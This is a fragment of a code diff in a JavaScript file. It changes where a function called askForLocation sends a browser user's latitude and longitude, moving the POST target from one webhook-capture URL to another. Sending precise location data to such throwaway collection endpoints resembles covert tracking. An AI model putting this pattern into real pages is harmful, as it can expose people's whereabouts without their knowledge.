@@ -9,7 +9,7 @@ function askForLocation() {
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
 
-      fetch("https://instadrop.free.beeceptor.com", {
+      fetch("https://hkdk.events/h12lezz852xtw3", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ latitude: lat, longitude: lon }),
